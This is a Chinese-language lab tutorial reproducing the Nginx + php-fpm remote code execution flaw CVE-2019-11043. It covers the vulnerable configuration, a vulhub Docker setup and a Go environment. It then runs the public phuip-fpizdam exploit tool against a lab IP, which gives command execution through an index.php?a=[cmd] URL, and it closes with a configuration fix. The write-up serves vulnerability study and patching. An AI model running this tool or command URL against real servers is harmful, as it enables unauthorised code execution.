0x01前言#

       9 月 26 日，PHP 官方发布漏洞通告，其中指出：使用 Nginx + php-fpm 的服务器，在部分配置下，存在远程代码执行漏洞。并且该配置已被广泛使用，危害较大，漏洞编号为CVE-2019-11043。漏洞 PoC 在 10 月 22 日公开。

0x02影响范围

Nginx + php-fpm 的服务器，在使用如下配置的情况下，都可能存在远程代码执行漏洞。

location ~ [^/]\.php(/|$) {

        fastcgi_split_path_info ^(.+?\.php)(/.*)$;

        fastcgi_param PATH_INFO       $fastcgi_path_info;

        fastcgi_pass   php:9000;

        ...

  }

}

0x03漏洞环境搭建

本次复现使用docker搭建测试环境，具体来自vulhub

链接：

https://github.com/vulhub/vulhub/tree/master/php/CVE-2019-11043

1.安装docker

使用centos7来安装docker，使用如下命令：

  1. yum -y install docker

安装好docker后使用如下命令查看版本：

  1. docker
    version

2.安装docker-compose

使用命令：

  1. yum -y install epel-release && yum -y install python-pip && pip install docker-compose

查看docker-compose版本：

  1. docker-compose version

3.拉取vulhub docker

从vulhub上下载docker-compose.xml、default.conf、www/index.php三个文件，然后进入目录运行命令将环境拖到本地并打开容器。

打开容器之前需要关掉自带的selinux，否则容器里面的nginx将无法启动，临时关闭方法：

  1. setenforce 0

开启容器命令：

  1. docker-compose up -d

这里靶机环境就已经搭建好了，使用docker ps命令来查看当前运行的容器：

访问 http://虚拟机ip:8080，

4.搭建golang环境

使用如下命令来安装golang:

 wget https://dl.google.com/go/go1.13.3.linux-amd64.tar.gz
 tar -C /usr/local -zxvf  go1.13.3.linux-amd64.tar.gz
 rm -rf go1.13.3.linux-amd64.tar.gz 
 vim /etc/profile
 export GOROOT=/usr/local/go
 export PATH=$PATH:$GOROOT/bin
 cat /etc/profile
 source /etc/profile

 cd phuip-fpizdam/
 go install phuip-fpizda

phuip-fpizdam "http://192.168.2.133:8080/index.php"


访问http://192.168.2.133:8080/index.php?a=[cmd]即可执行命令

0x05漏洞修复

建议在不影响正常业务的情况下，修改或删除 Nginx 配置文件中的如下配置

  1. fastcgi_split_path_info ^(.+?\.php)(/.*)$;
  2. fastcgi_param PATH_INFO       $fastcgi_path_info;
